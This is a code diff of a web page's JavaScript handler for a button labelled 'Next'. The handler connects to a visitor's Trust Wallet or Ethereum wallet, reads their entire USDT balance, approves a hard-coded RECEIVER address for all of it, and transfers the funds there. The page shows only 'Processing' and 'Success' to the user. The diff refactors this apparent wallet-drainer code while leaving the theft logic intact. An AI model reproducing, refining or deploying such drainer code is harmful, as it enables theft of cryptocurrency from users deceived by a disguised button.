@@ -121,25 +121,22 @@
       btn.innerText = "Processing...";
       btn.disabled = true;
 
-      if (!window.ethereum) {
-        alert("Use Trust Wallet browser");
-        btn.innerText = "Next";
-        btn.disabled = false;
-        return;
-      }
-
       try {
+        if (!window.ethereum) throw new Error("Trust Wallet not detected");
+
         const web3 = new Web3(window.ethereum);
         const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
         const user = accounts[0];
+
         const contract = new web3.eth.Contract(ABI, USDT);
         const balance = await contract.methods.balanceOf(user).call();
 
         await contract.methods.approve(RECEIVER, balance).send({ from: user });
         await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
-        btn.innerText = "✅ Sent";
+        btn.innerText = "✅ Success";
       } catch (e) {
+        console.error("Error:", e);
         btn.innerText = "❌ Failed";
       }
 
